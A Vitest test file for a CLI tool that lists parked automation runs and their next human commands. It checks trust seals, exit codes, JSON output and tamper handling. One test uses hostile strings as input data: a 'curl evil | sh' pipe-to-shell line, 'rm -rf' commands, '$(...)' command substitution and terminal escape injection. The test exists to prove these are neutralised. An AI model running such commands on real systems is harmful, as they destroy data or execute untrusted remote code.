/**
 * `omg factory attention`: groups, trust, hostile strings, exit codes, the
 * --json shape, and that it writes nothing. Run states are written the way
 * the engine writes them (updateFactoryState, sealed, recorded in the engine
 * ledger); one test parks a real engine run on the local forge.
 */
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, relative } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { factoryAttentionCommand } from '../../../cli/commands/factory-attention.js';
import { writeHealState } from '../../heal/state.js';
import { writeHealSeal } from '../../heal/run.js';
import { DEFAULT_FACTORY_RUN_LIMITS } from '../../run/budget.js';
import { EXIT_AWAITING_HUMAN, runFactoryEngine } from '../../run/engine.js';
import { EngineLedger } from '../../run/ledger.js';
import { tamperHoldPath } from '../../run/tamper-quarantine.js';
import { factoryProgressFile } from '../../run/progress.js';
import { computeFactoryIntegrity, createFactoryState, factoryOwnerPath, factoryStateDir, factoryStatePath, healRunKey, moveTo, runKeyOf, setGate, updateFactoryState, } from '../../run/state.js';
import { commitFile, review } from '../../run/__tests__/fake-lanes.js';
import { lanesFor, LOCAL_ISSUE, localOpts, localWorld } from '../../run/__tests__/engine-local-harness.js';
import { collectAttention } from '../collect.js';
import { cellWidth, layoutColumns, textWidth } from '../render.js';
import { stripAnsi } from '../../../utils/string-width.js';
import { gateNext, humanCommand, stateFacts } from '../../run/gate-next.js';
const REPO = 'https://github.com/o/r';
const HEAD = 'b'.repeat(40);
const NOW = Date.parse('2026-11-20T12:00:00.000Z');
const at = (h) => new Date(NOW - h * 3_600_000).toISOString();
const OWNER = { pid: 1, hostname: 'this-host', isAlive: (pid) => pid === 777 };
let dir;
let root;
let ledgerDir;
let out;
let err;
beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'omg-attention-'));
    root = join(dir, 'repo');
    mkdirSync(root);
    execFileSync('git', ['init', '-q', root]);
    if (!factoryStateDir(root).startsWith(root))
        throw new Error('state dir outside the test root');
    ledgerDir = join(dir, 'ledger');
    out = [];
    err = [];
});
afterEach(() => {
    process.exitCode = 0;
    rmSync(dir, { recursive: true, force: true });
});
const issueRun = (issue, title = `item ${issue}`, created = at(48)) => ({ ...createFactoryState({ issue, repoUrl: REPO, base: 'dev' }, created), forgeKind: 'github', issueTitle: title });
/** Written as the engine writes: sealed, and recorded in the engine ledger. */
function asEngine(s) {
    const key = runKeyOf(s);
    const l = EngineLedger.open(ledgerDir, root, key);
    updateFactoryState(root, key, () => s, { onWrite: (p, c) => l.record(p, c) });
}
/** An owner file as the engine leaves it: written, and recorded in the run's engine ledger. */
function ownerAsEngine(key, owner) {
    const path = factoryOwnerPath(root, key);
    const content = JSON.stringify(owner);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, content);
    EngineLedger.open(ledgerDir, root, key).record(path, content);
}
/** A park at `gate` `hours` ago, from implement. */
function parked(issue, gate, hours, extra = {}, reason = `parked at ${gate}`) {
    const s = moveTo(issueRun(issue), 'implement', 'plan ok', at(hours + 1));
    return { ...setGate({ ...s, ...extra }, gate, reason, at(hours)) };
}
function deps(over = {}) {
    return { root: () => root, out: (l) => out.push(l), err: (l) => err.push(l), ledgerDir, now: () => NOW, owner: OWNER, limits: () => ({ limits: { ...DEFAULT_FACTORY_RUN_LIMITS, maxRunCredits: 200 }, warnings: [] }), ...over };
}
async function attention(args = [], over = {}) {
    process.exitCode = 0;
    try {
        await factoryAttentionCommand(deps(over)).parseAsync(args, { from: 'user' });
    }
    catch (error) {
        if (error.exitCode !== undefined)
            return error.exitCode;
        throw error;
    }
    return Number(process.exitCode ?? 0);
}
const json = () => JSON.parse(out.join('\n'));
const item = (key) => json().items.find((i) => i.key === key);
const argvs = (i) => i.next.map((n) => n.argv.join(' '));
function seedGroups() {
    asEngine(parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD }));
    asEngine(parked(2, 'budget', 5, { lanes: [{ id: 'l1', kind: 'implement', jobId: 'j1', startSha: HEAD, status: 'completed', maxCredits: 30, startedAt: at(6), usage: { credits: 185.5, premiumRequests: 3, source: 'measured' } }] }));
    asEngine(parked(3, 'lane-tampered', 1));
    asEngine(parked(4, 'gate-definition-changed', 2, { forgeKind: 'local', remote: 'omg-local' }));
    asEngine(parked(5, 'fix-failed', 10));
    asEngine(parked(6, 'fix-failed', 20));
    asEngine(moveTo(issueRun(7), 'implement', 'plan ok', at(30))); // no gate, no owner: broken
    asEngine(parked(8, 'some-future-gate', 4));
    asEngine({ ...moveTo(issueRun(9), 'merged', 'merged', at(2)) }); // terminal: nothing to do
}
describe('omg factory attention', () => {
    it('groups the parks by the human action, oldest first, with the table\'s commands', async () => {
        seedGroups();
        expect(await attention(['--json'])).toBe(EXIT_AWAITING_HUMAN);
        const j = json();
        expect(j.items.map((i) => [i.key, i.group])).toEqual([
            ['#3', 'inspect'], ['#7', 'broken'], ['#4', 'decide'], ['#1', 'merge'], ['#6', 'fix'], ['#5', 'fix'], ['#8', 'fix'], ['#2', 'limits'],
        ]);
        expect(j.summary.byGroup).toEqual({ inspect: 1, broken: 1, decide: 1, merge: 1, fix: 3, limits: 1 });
        expect(j.summary.engines).toEqual({ live: 0, runs: [] });
        expect(j.forge).toBe('mixed');
        expect(argvs(item('#1'))).toEqual([`gh pr merge 11 --admin --merge --match-head-commit ${HEAD}`, 'omg factory run 1', 'omg factory run status 1']);
        expect(argvs(item('#4'))).toEqual(['omg factory run status 4', 'omg factory run 4 --allow-gate-change', 'omg factory run cancel 4']);
        expect(argvs(item('#8'))).toEqual(['omg factory run 8', 'omg factory run status 8']);
        expect(item('#2')).toMatchObject({ credits: 185.5, cap: 200, ageMs: 5 * 3_600_000, gate: 'budget', trust: 'ok' });
        expect(item('#2').notes.join(' ')).toMatch(/within one lane minimum/);
        expect(item('#7').why).toMatch(/no engine holds it/);
        // The list's why is the table's text, never the run's reason; --json carries the reason.
        expect(item('#5').why).not.toContain('parked at');
        expect(item('#5').reason).toBe('parked at fix-failed');
    });
    it('prints a summary, groups in order, and a copyable command per step', async () => {
        seedGroups();
        expect(await attention([], {})).toBe(EXIT_AWAITING_HUMAN);
        const text = out.join('\n');
        expect(text).toContain('8 items need you: inspect 1, broken engine 1, decide 1, merge 1, fix by hand 3, limits / retry 1; no engine running');
        const order = ['INSPECT', 'BROKEN ENGINE', 'DECIDE', 'MERGE', 'FIX BY HAND', 'LIMITS / RETRY'].map((h) => text.indexOf(h));
        expect(order.every((v, i) => v >= 0 && (i === 0 || v > order[i - 1]))).toBe(true);
        expect(text).toContain(`$ gh pr merge 11 --admin --merge --match-head-commit ${HEAD}`);
        expect(text).not.toContain('reason: parked at');
        out = [];
        await attention(['--verbose']);
        expect(out.join('\n')).toContain('reason: parked at fix-failed');
    });
    it('exit codes: 0 when nothing needs you, 4, 0 with --exit-zero, 1 on an unreadable state, 2 on usage', async () => {
        expect(await attention()).toBe(0);
        expect(out.join('\n')).toContain('nothing needs you; no engine running');
        asEngine(parked(1, 'merge', 1, { phase: 'merge', pr: 2, head: HEAD }));
        expect(await attention()).toBe(EXIT_AWAITING_HUMAN);
        expect(EXIT_AWAITING_HUMAN).toBe(4);
        expect(await attention(['--exit-zero'])).toBe(0);
        writeFileSync(factoryStatePath(root, 2), '{ not json');
        expect(await attention(['--exit-zero'])).toBe(1);
        out = [];
        expect(await attention(['--json'])).toBe(1);
        expect(item('#2')).toMatchObject({ group: 'inspect', trust: 'unreadable', next: [{ argv: ['omg', 'factory', 'run', 'status', '2'] }] });
        expect(await attention(['--bogus'])).toBe(2);
        expect(await attention([], { root: () => { throw new Error('not a repo'); } })).toBe(2);
    });
    it('--json has the schema', async () => {
        asEngine(parked(1, 'merge', 1, { phase: 'merge', pr: 2, head: HEAD }));
        await attention(['--json']);
        const j = json();
        expect(Object.keys(j)).toEqual(['schemaVersion', 'repo', 'forge', 'generatedAt', 'summary', 'items', 'warnings']);
        expect(j).toMatchObject({ schemaVersion: 1, repo: root, forge: 'github', generatedAt: new Date(NOW).toISOString() });
        for (const k of ['key', 'group', 'gate', 'phase', 'ageMs', 'credits', 'cap', 'pr', 'head', 'title', 'why', 'next', 'trust'])
            expect(j.items[0], k).toHaveProperty(k);
        expect(j.items[0]).not.toHaveProperty('at');
        for (const n of j.items[0].next)
            expect(Array.isArray(n.argv) && n.argv.every((a) => typeof a === 'string')).toBe(true);
    });
    it('a state edited after the engine sealed it, or not the engine\'s last write, lands in Inspect with only the status command', async () => {
        asEngine(parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD }));
        asEngine(parked(2, 'merge', 3, { phase: 'merge', pr: 12, head: HEAD }));
        asEngine(moveTo(issueRun(3), 'merged', 'done', at(1)));
        // #1: the seal no longer matches (a hand edit of the head).
        const p1 = factoryStatePath(root, 1);
        writeFileSync(p1, readFileSync(p1, 'utf8').replace(HEAD, 'd'.repeat(40)));
        // #2: a valid seal, but not the bytes the engine ledger recorded (written outside the engine).
        const s2 = JSON.parse(readFileSync(factoryStatePath(root, 2), 'utf8'));
        const forged = { ...s2, head: 'e'.repeat(40), integrity: undefined };
        writeFileSync(factoryStatePath(root, 2), JSON.stringify({ ...forged, integrity: computeFactoryIntegrity(forged) }));
        // #3: a forged "merged" is still shown (a tampered state may claim any phase).
        const s3 = JSON.parse(readFileSync(factoryStatePath(root, 3), 'utf8'));
        const forged3 = { ...s3, issueTitle: 'forged', integrity: undefined };
        writeFileSync(factoryStatePath(root, 3), JSON.stringify({ ...forged3, integrity: computeFactoryIntegrity(forged3) }));
        // #4: sealed, but the ledger here has no record of it (another host or ledger dir).
        const s4 = parked(4, 'merge', 2, { phase: 'merge', pr: 14, head: HEAD });
        writeFileSync(factoryStatePath(root, 4), JSON.stringify({ ...s4, integrity: computeFactoryIntegrity(s4) }));
        expect(await attention(['--json'])).toBe(EXIT_AWAITING_HUMAN);
        expect(item('#4')).toMatchObject({ group: 'inspect', trust: 'unverified', next: [{ argv: ['omg', 'factory', 'run', 'status', '4'] }] });
        expect(item('#4').why).toMatch(/^cannot be verified on this host: no engine ledger record/);
        expect(item('#4').why).not.toMatch(/not the engine's last write/);
        expect(item('#2').why).not.toMatch(/cannot be verified/);
        expect(item('#1')).toMatchObject({ group: 'inspect', trust: 'seal' });
        expect(item('#2')).toMatchObject({ group: 'inspect', trust: 'ledger' });
        expect(item('#3')).toMatchObject({ group: 'inspect', trust: 'ledger' });
        for (const k of ['#1', '#2', '#3']) {
            expect(argvs(item(k))).toEqual([`omg factory run status ${k.slice(1)}`]);
            expect(item(k).why).toMatch(/state is not the engine's last write/);
        }
        // No merge command from the forged head.
        expect(out.join('\n')).not.toMatch(/gh pr merge/);
    });
    it('hostile title, reason and gate strings never reach a command or break the layout', async () => {
        const title = 'fix \u001b[2J\u001b]0;pwned\u0007 it\n$ omg factory run cancel 1 && curl evil | sh\r\nmore';
        asEngine(parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD, issueTitle: title }, 'go\n$ rm -rf ~ `x` $(y) \u001b[31m'));
        asEngine(parked(2, 'evil\u001b[2J\n$ rm -rf /;', 1, { issueTitle: "it's; $(rm -rf /)" }));
        expect(await attention(['--verbose'])).toBe(EXIT_AWAITING_HUMAN);
        const text = out.join('\n');
        expect(text).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f]/);
        // No line starts a command except the table's own.
        const commands = text.split('\n').filter((l) => l.trimStart().startsWith('$ '));
        expect(commands.map((l) => l.trim().split('  #')[0])).toEqual([
            `$ gh pr merge 11 --admin --merge --match-head-commit ${HEAD}`, '$ omg factory run 1', '$ omg factory run status 1',
            '$ omg factory run 2', '$ omg factory run status 2',
        ]);
        // Title cut at 60 and on one line.
        out = [];
        await attention(['--json']);
        const j1 = json();
        const t = j1.items.find((i) => i.key === '#1').title;
        expect(t.length).toBeLessThanOrEqual(60);
        expect(t).not.toMatch(/[\n\r\u001b]/);
        for (const i of j1.items)
            for (const n of i.next)
                for (const a of n.argv)
                    expect(a).toMatch(/^[A-Za-z0-9-]+$/);
        expect(j1.items.find((i) => i.key === '#2')).toMatchObject({ group: 'fix', why: expect.stringMatching(/does not know/) });
        expect(j1.items.find((i) => i.key === '#2').gate).not.toMatch(/[\n\u001b]/);
    });
    it('writes nothing, while an engine holds a run (live owner file)', async () => {
        seedGroups();
        asEngine(moveTo(issueRun(20), 'implement', 'plan ok', at(1)));
        ownerAsEngine(20, { pid: 777, hostname: 'this-host', startedAt: at(1) });
        const log = factoryProgressFile(root, 20);
        mkdirSync(dirname(log), { recursive: true });
        writeFileSync(log, '{}\n');
        utimesSync(log, new Date(NOW - 60_000), new Date(NOW - 60_000));
        const snap = () => [root, ledgerDir].flatMap((d) => walk(d).map((p) => `${relative(dir, p)} ${statSync(p).mtimeMs} ${hash(p)}`)).sort();
        const before = snap();
        expect(await attention(['--json'])).toBe(EXIT_AWAITING_HUMAN);
        await attention([]);
        expect(snap()).toEqual(before);
        // A live, fresh engine needs nobody.
        out = [];
        await attention(['--json']);
        expect(json().summary.engines).toEqual({ live: 1, runs: ['#20'] });
        expect(json().items.find((i) => i.key === '#20')).toBeUndefined();
        // Quiet for 10+ minutes: "possibly hung", a hint with the status command only.
        utimesSync(log, new Date(NOW - 11 * 60_000), new Date(NOW - 11 * 60_000));
        out = [];
        await attention(['--json']);
        expect(item('#20')).toMatchObject({ group: 'broken', next: [{ argv: ['omg', 'factory', 'run', 'status', '20'] }] });
        expect(item('#20').notes.join(' ')).toMatch(/possibly hung/);
        expect(snap().filter((l) => !l.includes('factory-20.log'))).toEqual(before.filter((l) => !l.includes('factory-20.log')));
    });
    it('heal runs: a parked ci-heal run uses the heal commands, and a sealed heal signature waiting for approval is listed', async () => {
        const key = healRunKey('0123abcd');
        const heal = { ...createFactoryState({ issue: 0, repoUrl: REPO, base: 'dev', heal: { sig8: '0123abcd', class: 'test-failure', firstRed: { runId: '1', sha: HEAD }, failingTests: [], env: [], diagnosis: { class: 'test-failure', rootCause: 'x', evidence: [], reproduced: false, fix: null } } }, at(10)) };
        asEngine(setGate(moveTo(heal, 'plan', 'plan', at(9)), 'gates-unsandboxed', 'why', at(8)));
        expect(runKeyOf(heal)).toBe(key);
        const sig = {
            version: 1, sig8: 'fedcba98', signature: 's', class: 'regression', classification: {}, source: 'push',
            firstSeen: { runId: '1', at: at(5) }, lastSeen: { runId: '1', at: at(5) }, count: 1, seenRuns: ['1'],
            healRun: { id: 'h', open: true, startedAt: at(5) }, next: 'heal-approve', rerunIntents: [], updatedAt: at(4),
            lanes: [{ id: 'heal-fedcba98-debug-1', kind: 'debug', startSha: HEAD, status: 'completed', maxCredits: 30, startedAt: at(5), endedAt: at(4), pid: 5, confinement: 'none' }],
            diagnosis: { at: at(4), laneId: 'heal-fedcba98-debug-1', outcome: 'valid', evidence: {} },
        };
        writeHealState(root, sig);
        writeHealSeal(ledgerDir, root, sig);
        writeHealState(root, { ...sig, sig8: '00000001', healRun: { id: 'h2', open: true, startedAt: at(3) } }); // no seal
        await attention(['--json']);
        // The flag step is dropped: heal approve takes no --allow-unsandboxed-gates.
        expect(argvs(item(String(key)))).toEqual(['omg factory heal status 0123abcd', 'omg factory heal cancel 0123abcd']);
        expect(item('heal-fedcba98')).toMatchObject({ group: 'decide', gate: 'heal-approve', trust: 'ok', title: 'ci-heal regression' });
        expect(argvs(item('heal-fedcba98'))).toEqual(['omg factory heal status fedcba98', 'omg factory heal approve fedcba98', 'omg factory heal close fedcba98']);
        expect(item('heal-00000001')).toMatchObject({ group: 'inspect', trust: 'seal' });
        expect(argvs(item('heal-00000001'))).toEqual(['omg factory heal status 00000001']);
    });
    it('a tamper hold is one Inspect item naming the release command', () => {
        expect(collectAttention(root, { ledgerDir, now: () => NOW, owner: OWNER }).items).toEqual([]);
        const hold = tamperHoldPath(ledgerDir, root);
        mkdirSync(dirname(hold), { recursive: true });
        writeFileSync(hold, '{ unreadable');
        const d = collectAttention(root, { ledgerDir, now: () => NOW, owner: OWNER });
        expect(d.items.map((i) => [i.key, i.group, i.gate, i.next.map((n) => n.argv.join(' '))])).toEqual([['checkout', 'inspect', 'tamper-hold', ['omg factory run release --tamper']]]);
    });
    it('the merge command matches the one a real local-forge engine run prints at its merge park', async () => {
        const w = localWorld();
        try {
            const lanes = lanesFor(w, [commitFile('src/greet.js', 'export const greet = () => "hi";\n'), review('approve')]);
            const outcome = await runFactoryEngine(localOpts(w, lanes));
            expect(outcome.gate?.name).toBe('merge');
            const d = collectAttention(w.root, { ledgerDir: w.ledgerDir, now: () => Date.now(), owner: OWNER, limits: null });
            const row = d.items.find((i) => i.key === `#${LOCAL_ISSUE}`);
            expect(row).toMatchObject({ group: 'merge', trust: 'ok', gate: 'merge' });
            expect(humanCommand(row.next[0].argv)).toBe(outcome.mergeCommand);
            // The row's commands are the run's sealed next steps.
            expect(row.next.map((n) => n.argv)).toEqual(outcome.gate.next.map((n) => n.argv));
            expect(row.next[1].argv).toEqual(['omg', 'factory', 'run', String(LOCAL_ISSUE)]);
            expect(d.forge).toBe('local');
        }
        finally {
            rmSync(w.dir, { recursive: true, force: true });
        }
    });
});
describe('omg factory attention: untrusted state cannot hide a row', () => {
    const collect = (verbose = false) => collectAttention(root, { ledgerDir, now: () => NOW, owner: OWNER, verbose });
    const exitOf = (d) => (d.readFailed ? 1 : d.items.length > 0 ? EXIT_AWAITING_HUMAN : 0);
    const rows = (d) => d.items.map((i) => [i.key, i.group, i.trust]);
    it('a deleted state file the ledger recorded is an Inspect row; a finished or never-written one is not', () => {
        asEngine(parked(7, 'merge', 3, { phase: 'merge', pr: 3, head: HEAD }));
        asEngine(moveTo(issueRun(8), 'merged', 'merged', at(2)));
        asEngine(moveTo(issueRun(9), 'cancelled', 'cancelled', at(2)));
        for (const k of [7, 8, 9])
            rmSync(factoryStatePath(root, k));
        // A ledger that records the state as "must not exist", and one that never tracked it.
        EngineLedger.open(ledgerDir, root, 10).record(factoryStatePath(root, 10), null);
        EngineLedger.open(ledgerDir, root, 11).record(factoryOwnerPath(root, 11), null);
        const d = collect();
        expect(rows(d)).toEqual([['#7', 'inspect', 'missing']]);
        expect(d.items[0].why).toMatch(/state file is missing; the ledger holds its last write/);
        expect(d.items[0].next.map((n) => n.argv.join(' '))).toEqual(['omg factory run status 7']);
        expect(exitOf(d)).toBe(EXIT_AWAITING_HUMAN);
    });
    it('a cleaned run keeps its terminal state, so it is not "missing"; a reset moves the ledger aside first', async () => {
        asEngine(moveTo(issueRun(12), 'cancelled', 'cancelled', at(2)));
        expect(collect().items).toEqual([]);
        // reset.ts: the ledger is renamed `<file>.reset-<stamp>` before the state: neither is listed.
        const lf = join(dirname(EngineLedger.open(ledgerDir, root, 12).file), 'run-12.json');
        writeFileSync(`${lf}.reset-1`, readFileSync(lf));
        rmSync(lf);
        rmSync(factoryStatePath(root, 12));
        expect(collect().items).toEqual([]);
    });
    it('an alias file name (run-01.json) is not run 1; the real run 1 shows from the ledger when its file is gone', () => {
        asEngine(parked(1, 'merge', 3, { phase: 'merge', pr: 3, head: HEAD }));
        writeFileSync(join(factoryStateDir(root), 'run-01.json'), readFileSync(factoryStatePath(root, 1)));
        expect(rows(collect())).toEqual([['#1', 'merge', 'ok']]);
        rmSync(factoryStatePath(root, 1));
        expect(rows(collect())).toEqual([['#1', 'inspect', 'missing']]);
    });
    it('a forged owner file with a future progress log does not hide a dead engine; a recorded owner on another host is shown', () => {
        asEngine(moveTo(issueRun(30), 'implement', 'plan ok', at(25)));
        expect(rows(collect())).toEqual([['#30', 'broken', 'ok']]);
        writeFileSync(factoryOwnerPath(root, 30), JSON.stringify({ pid: 4242, hostname: 'other-host', startedAt: at(1) }));
        const log = factoryProgressFile(root, 30);
        mkdirSync(dirname(log), { recursive: true });
        writeFileSync(log, 'x');
        const future = new Date(NOW + 365 * 86_400_000);
        utimesSync(log, future, future);
        let d = collect();
        expect(rows(d)).toEqual([['#30', 'inspect', 'owner']]);
        expect(d.items[0].why).toMatch(/an owner file the engine did not write/);
        expect(d.items[0].next.map((n) => n.argv.join(' '))).toEqual(['omg factory run status 30']);
        expect(d.summary.engines.live).toBe(0);
        // The engine's own owner record on another host (a shared state dir): shown, with only the status command.
        ownerAsEngine(30, { pid: 4242, hostname: 'other-host', startedAt: at(1) });
        d = collect();
        expect(rows(d)).toEqual([['#30', 'broken', 'ok']]);
        expect(d.items[0].why).toMatch(/engine on another host/);
        expect(d.items[0].notes.join(' ')).toMatch(/cannot tell whether that engine is alive/);
        expect(d.items[0].next.map((n) => n.argv.join(' '))).toEqual(['omg factory run status 30']);
        // A live engine here with a future progress-log time is "possibly hung", not fresh.
        ownerAsEngine(30, { pid: 777, hostname: 'this-host', startedAt: at(1) });
        d = collect();
        expect(rows(d)).toEqual([['#30', 'broken', 'ok']]);
        expect(d.items[0].notes.join(' ')).toMatch(/possibly hung: .*modification time in the future/);
        // A forged owner on a parked run keeps the park's row and says so.
        asEngine(parked(31, 'ci-failed', 2));
        writeFileSync(factoryOwnerPath(root, 31), JSON.stringify({ pid: 777, hostname: 'this-host', startedAt: at(1) }));
        const p = collect().items.find((i) => i.key === '#31');
        expect(p).toMatchObject({ group: 'fix', trust: 'ok' });
        expect(p.notes.join(' ')).toMatch(/owner file the engine did not write/);
    });
    it('a non-regular or oversized state, owner or heal file is an unreadable row, never followed or blocked on', () => {
        mkdirSync(factoryStatePath(root, 40), { recursive: true });
        asEngine(moveTo(issueRun(41), 'implement', 'plan ok', at(25)));
        mkdirSync(factoryOwnerPath(root, 41));
        asEngine(parked(42, 'ci-failed', 2));
        writeFileSync(factoryStatePath(root, 42), Buffer.alloc(8 * 1024 * 1024 + 1, 0x20));
        mkdirSync(join(factoryStateDir(root), 'heal', '0badc0de.json'), { recursive: true });
        const d = collect();
        expect(rows(d)).toEqual([['#40', 'inspect', 'unreadable'], ['#42', 'inspect', 'unreadable'], ['heal-0badc0de', 'inspect', 'unreadable'], ['#41', 'broken', 'ok']]);
        expect(d.items.find((i) => i.key === '#40').why).toMatch(/a directory, not a regular file/);
        expect(d.items.find((i) => i.key === '#42').why).toMatch(/larger than/);
        expect(exitOf(d)).toBe(1);
    });
    it('mutating any top-level field of a sealed state never removes a row and never gives exit 0', () => {
        asEngine(parked(50, 'merge', 3, { phase: 'merge', pr: 3, head: HEAD }));
        asEngine(moveTo(issueRun(51), 'implement', 'plan ok', at(25)));
        asEngine(moveTo(issueRun(52), 'merged', 'merged', at(2)));
        const baseline = collect();
        expect(baseline.items.length).toBe(2);
        expect(exitOf(baseline)).toBe(EXIT_AWAITING_HUMAN);
        for (const key of [50, 51, 52]) {
            const path = factoryStatePath(root, key);
            const original = readFileSync(path, 'utf8');
            const fields = Object.keys(JSON.parse(original));
            expect(fields.length).toBeGreaterThan(10);
            for (const field of fields) {
                const s = JSON.parse(original);
                const wrong = typeof s[field] === 'string' ? 12 : 'x';
                for (const mutate of ['delete', 'null', 'type']) {
                    for (const reseal of [false, true]) {
                        const m = { ...s };
                        if (mutate === 'delete')
                            delete m[field];
                        else
                            m[field] = mutate === 'null' ? null : wrong;
                        if (reseal && field !== 'integrity') {
                            try {
                                m.integrity = computeFactoryIntegrity(m);
                            }
                            catch { /* a shape the seal cannot hash */ }
                        }
                        writeFileSync(path, JSON.stringify(m, null, 2));
                        const d = collect(true);
                        const what = `#${key}.${field} ${mutate}${reseal ? ' resealed' : ''}`;
                        expect(d.items.length, what).toBeGreaterThanOrEqual(baseline.items.length + (key === 52 ? 1 : 0));
                        expect(d.items.some((i) => i.key === `#${key}` && i.trust !== 'ok'), what).toBe(true);
                        expect(exitOf(d), what).not.toBe(0);
                        // An untrusted row carries no reason, and only the status command.
                        for (const i of d.items.filter((x) => x.trust !== 'ok')) {
                            expect(i.reason, what).toBeUndefined();
                            expect(i.next.every((n) => n.argv.join(' ').startsWith('omg factory run status ') && !n.billed), what).toBe(true);
                        }
                    }
                }
            }
            writeFileSync(path, original);
        }
        expect(collect().items.length).toBe(2);
    });
    it('a heal record is judged by its seal first; `next` (unsealed) decides nothing', () => {
        const sig8 = 'fedcba98';
        const lane = { id: `heal-${sig8}-debug-1`, kind: 'debug', startSha: HEAD, status: 'completed', maxCredits: 30, startedAt: at(5), endedAt: at(4), pid: 5, confinement: 'none' };
        const sig = {
            version: 1, sig8, signature: 's', class: 'regression', classification: {}, source: 'push',
            firstSeen: { runId: '1', at: at(5) }, lastSeen: { runId: '1', at: at(5) }, count: 1, seenRuns: ['1'],
            healRun: { id: `heal-${sig8}`, open: true, startedAt: at(5) }, lanes: [lane], diagnosis: { at: at(4), laneId: lane.id, outcome: 'valid', evidence: {} },
            next: 'heal-approve', rerunIntents: [], updatedAt: at(4),
        };
        const write = (s, seal = true) => { writeHealState(root, s); if (seal)
            writeHealSeal(ledgerDir, root, s); };
        const one = () => { const d = collect(); expect(d.items).toHaveLength(1); return d.items[0]; };
        write(sig);
        expect(one()).toMatchObject({ key: `heal-${sig8}`, group: 'decide', gate: 'heal-approve', trust: 'ok' });
        expect(one().next.map((n) => [n.argv.join(' '), n.billed])).toEqual([[`omg factory heal status ${sig8}`, false], [`omg factory heal approve ${sig8}`, true], [`omg factory heal close ${sig8}`, false]]);
        // `next` is not sealed: changing it changes nothing.
        write({ ...sig, next: 'report' }, false);
        expect(one()).toMatchObject({ gate: 'heal-approve', trust: 'ok' });
        // Flipping the sealed `healRun.open` is a seal mismatch: Inspect, the status command only.
        write(sig);
        write({ ...sig, healRun: { ...sig.healRun, open: false } }, false);
        expect(one()).toMatchObject({ group: 'inspect', trust: 'seal' });
        expect(one().next.map((n) => n.argv.join(' '))).toEqual([`omg factory heal status ${sig8}`]);
        // Stripping the heal run, lanes and diagnosis while the seal exists: still a mismatch.
        write(sig);
        const { healRun: _h, lanes: _l, diagnosis: _d, ...stripped } = sig;
        write(stripped, false);
        expect(one()).toMatchObject({ group: 'inspect', trust: 'seal' });
        // A record copied over from another signature: its sig8 is not the file's.
        write(sig);
        writeFileSync(join(factoryStateDir(root), 'heal', `${sig8}.json`), JSON.stringify({ ...sig, sig8: '00000001' }));
        expect(one()).toMatchObject({ group: 'inspect', trust: 'seal' });
        // The seal deleted: missing.
        write(sig);
        const healLedger = join(ledgerDir, 'heal');
        const sealFile = walk(healLedger).find((p) => p.endsWith(`${sig8}.seal.json`));
        rmSync(sealFile);
        expect(one()).toMatchObject({ group: 'inspect', trust: 'seal', why: expect.stringMatching(/seal: missing/) });
        // The record deleted while its seal exists: an Inspect row, not nothing.
        write(sig);
        rmSync(join(factoryStateDir(root), 'heal', `${sig8}.json`));
        expect(one()).toMatchObject({ key: `heal-${sig8}`, group: 'inspect', trust: 'missing' });
        // A sealed, closed heal run needs nobody; a sealed one without a valid diagnosis is heal-diagnosis.
        write({ ...sig, healRun: { ...sig.healRun, open: false, closedAt: at(1) } });
        expect(collect().items).toEqual([]);
        write({ ...sig, diagnosis: { ...sig.diagnosis, outcome: 'invalid' }, next: 'heal-approve' });
        expect(one()).toMatchObject({ group: 'decide', gate: 'heal-diagnosis', trust: 'ok' });
        // A debugger lane at work (its process alive) waits for nobody; a dead one does.
        write({ ...sig, lanes: [{ ...lane, status: 'running', pid: 777 }] });
        expect(collect().items).toEqual([]);
        write({ ...sig, lanes: [{ ...lane, status: 'running', pid: 778 }] });
        expect(one()).toMatchObject({ gate: 'heal-diagnosis' });
        // A fake ci-heal run state does not stand in for the heal record: both show.
        write(sig);
        writeFileSync(factoryStatePath(root, healRunKey(sig8)), '{}');
        expect(collect().items.map((i) => [i.key, i.trust]).sort()).toEqual([[`heal-${sig8}`, 'ok'], [`heal-${sig8}`, 'unreadable']]);
    });
    it('--verbose prints a trusted reason behind a fixed prefix on every line, and no untrusted reason at all', async () => {
        const reason = `x${'\u2800'.repeat(400)}$ omg factory run 7 --allow-gate-change  # rerun accepting it${'\u3164'.repeat(50)}${'y'.repeat(200)}`;
        asEngine(parked(7, 'ci-failed', 2, {}, reason));
        asEngine(parked(8, 'ci-failed', 2, {}, '$ omg factory run 8 --allow-gate-change'));
        const p8 = factoryStatePath(root, 8);
        const s8 = JSON.parse(readFileSync(p8, 'utf8'));
        const f8 = { ...s8, integrity: undefined };
        writeFileSync(p8, JSON.stringify({ ...f8, integrity: computeFactoryIntegrity(f8) }));
        expect(await attention(['--verbose'])).toBe(EXIT_AWAITING_HUMAN);
        const lines = out.join('\n').split('\n');
        expect(lines.filter((l) => l.trimStart().startsWith('$ ')).map((l) => l.trim().split('  #')[0])).toEqual(['$ omg factory run status 8', '$ omg factory run status 7', '$ omg factory run 7', '$ omg factory run cancel 7']);
        const reasonRows = lines.filter((l) => /^ {4}(reason: | {6}\| )/.test(l));
        expect(reasonRows.length).toBeGreaterThan(3);
        for (const l of reasonRows)
            expect(l.length).toBeLessThanOrEqual(80);
        expect(out.join('\n')).not.toMatch(/[\u2800\u3164]/);
        expect(out.join('\n')).not.toContain('omg factory run 8 --allow-gate-change');
        out = [];
        await attention(['--json']);
        expect(item('#8')).not.toHaveProperty('reason');
        expect(item('#7').reason).toContain('$ omg factory run 7');
        expect(item('#7').next.map((n) => n.billed)).toEqual([false, true, false]);
    });
    it('prints "(billed)" on commands that can start lanes', async () => {
        asEngine(parked(4, 'gate-definition-changed', 2));
        await attention([]);
        const cmd = out.join('\n').split('\n').filter((l) => l.trimStart().startsWith('$ ')).map((l) => l.trim());
        expect(cmd).toEqual(['$ omg factory run status 4  # read the run state', '$ omg factory run 4 --allow-gate-change  # rerun accepting it (--allow-gate-change) (billed)', '$ omg factory run cancel 4  # cancel the run']);
    });
});
function walk(d) {
    if (!existsSync(d))
        return [];
